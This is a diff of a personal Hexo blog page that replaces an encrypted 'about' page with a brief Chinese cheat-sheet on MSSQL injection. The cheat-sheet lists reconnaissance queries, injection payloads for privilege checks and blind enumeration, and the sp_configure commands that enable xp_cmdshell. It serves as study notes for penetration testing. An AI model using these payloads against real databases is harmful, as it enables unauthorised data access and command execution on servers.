@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>about | Mr.Framework</title>
+  <title>Mr.Framework</title>
   <meta name="keywords" content="">
-  <meta name="description" content="about | Mr.Framework">
+  <meta name="description" content="Mr.Framework">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found: 该页面无法显示很抱歉，您所访问的地址并不存在">
 <meta property="og:type" content="website">
@@ -621,8 +621,6 @@
     <div class="pjax">
         <article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">about</h1>
-    
     <div class="article-meta">
         
         
@@ -631,12 +629,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-08 19:41:14'>2020-12-08 19:41</time>
+            Created At : <time class="date" title='Updated At: 2020-12-20 19:36:19'>2020-12-20 19:36</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:98</span>
+        <span>Count:224</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -666,7 +664,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-MSSQL%E6%B3%A8%E5%85%A5"><span class="toc-text">1. MSSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">1.1. 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-text">1.2. 注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-%E5%AF%BB%E6%89%BE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">1.2.1. 寻找存储过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-xxx"><span class="toc-text">1.2.2. xxx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%9D%83%E9%99%90%E6%8E%A2%E6%B5%8B"><span class="toc-text">1.3. 权限探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-text">1.4. 文件操作</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -682,46 +680,39 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <script src=/js/crypto-js.js></script>
-<script>
-function doDecrypt (pwd, onError) {
-	console.log('in doDecrypt');
-	const txt = document.getElementById('enc_content').innerHTML;
-	let plantext;
-	try {
-		const bytes = CryptoJS.AES.decrypt(txt, pwd);
-		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
-	} catch(err) {
-		if(onError) {
-			onError(err);
-		}
-		return;
-	}
-	document.getElementById('enc_content').innerHTML = plaintext;
-	document.getElementById('enc_content').style.display = 'block';
-	document.getElementById('enc_passwd').style.display = 'none';
-	if(typeof MathJax !== 'undefined') {
-		MathJax.Hub.Queue(
-			['resetEquationNumbers', MathJax.InputJax.TeX],
-			['PreProcess', MathJax.Hub],
-			['Reprocess', MathJax.Hub]
-		);
-	}
-}
-</script>
-<div id="enc_content" style="display:none">U2FsdGVkX1/Gh8MvUgBI6841Os0Wy2Tueq0mfjWLafEYI3J6FC3sKMFYL1fUdxVpUPoW0zKGQ5qEI4kGY7VQlA==</div>
-<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
-<script>
-var onError = function(error) {
-	document.getElementById("enc_error").innerHTML = "password error!"
-};
-function decrypt() {
-var passwd = document.getElementById("enc_pwd_input").value;
-console.log(passwd);
-doDecrypt(passwd, onError);
-}
-</script>
-</div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
+        <p>MSSQL注入</p>
+<h1 id="1-MSSQL注入"><a href="#1-MSSQL注入" class="headerlink" title="1. MSSQL注入"></a>1. MSSQL注入</h1><h2 id="1-1-信息收集"><a href="#1-1-信息收集" class="headerlink" title="1.1. 信息收集"></a>1.1. 信息收集</h2><pre><code class="mssql">  @@version
+  select * from Users WHERE id=&#39;1&#39; and @@version like &#39;%14%&#39;;
+  select name,loginame from master..syslogins,master..sysprocesses
+  select user,system_user,suser_sname();
+  select is_srvrolemember(&#39;sysadmin&#39;);
+  @@SERVERNAME
+
+  select name from master..sysdatabases;
+  select DB_NAME(i)  #i代表第一个数据库
+  1&#39; and ((select host_name())=(select @@SERVERNAME))--  #判断站库分离
+
+</code></pre>
+<h2 id="1-2-注入流程"><a href="#1-2-注入流程" class="headerlink" title="1.2. 注入流程"></a>1.2. 注入流程</h2><h3 id="1-2-1-寻找存储过程"><a href="#1-2-1-寻找存储过程" class="headerlink" title="1.2.1. 寻找存储过程"></a>1.2.1. 寻找存储过程</h3><pre><code class="mssql">    select name from master..sysobjects where xtype=&#39;U&#39;;
+
+    * Sysobjects：一个系统视图，存放所有对象
+    * xtype： 代表对象类型 
+        * U --&gt;表（用户定义类型）
+        * V --&gt;视图
+        * P --&gt;存储过程
+        * X --&gt;扩展存储过程</code></pre>
+<h3 id="1-2-2-xxx"><a href="#1-2-2-xxx" class="headerlink" title="1.2.2. xxx"></a>1.2.2. xxx</h3><pre><code class="mssql">    and select substring(table_name,1,1) from information_schema.tables&gt;&#39;A&#39;;
+</code></pre>
+<h2 id="1-3-权限探测"><a href="#1-3-权限探测" class="headerlink" title="1.3. 权限探测"></a>1.3. 权限探测</h2><pre><code>  #判断开启xp_cmdshell
+  1&#39; and 1=(select count(*) from master..sysobjects where xtype=&#39;X&#39; and name=&#39;xp_cmdshell&#39;)--
+
+  #开启xp_cmdshell
+  exec sp_configure &#39;show advanced options&#39;,1
+  reconfigure
+  exec sp_configure &#39;xp_cmdshell&#39;,1
+  reconfigure --</code></pre>
+<h2 id="1-4-文件操作"><a href="#1-4-文件操作" class="headerlink" title="1.4. 文件操作"></a>1.4. 文件操作</h2><p><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL.git">MSSQL注入工具</a></p>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
     </div>
